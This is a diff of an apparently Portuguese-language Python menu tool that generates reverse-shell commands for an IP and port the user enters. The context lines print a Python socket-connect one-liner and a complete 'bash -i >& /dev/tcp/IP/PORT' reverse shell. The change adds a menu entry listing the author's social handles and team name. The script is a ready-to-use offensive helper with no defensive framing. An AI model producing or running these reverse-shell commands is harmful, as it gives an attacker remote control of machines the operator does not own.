@@ -30,8 +30,7 @@ if foda == 1:
 	print(""" 
 Comando:
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{})) """.format(ip_foda, porta_foda))
-	
-
+		
 
 elif foda == 2:
 	ip_fds = input("IP: ")
@@ -56,6 +55,13 @@ elif foda == 4:
 comando:
 bash -i >& /dev/tcp/{}/{} 0>&1""".format(ip_puta, porta_puta))
 	
+elif foda == 5:
+	print("""
+Instagram: @gt9sec
+TikTok:    @gt9sec
+Team:	   skullsec """)
+	
+
 else:
 	print("opção invalida")
 
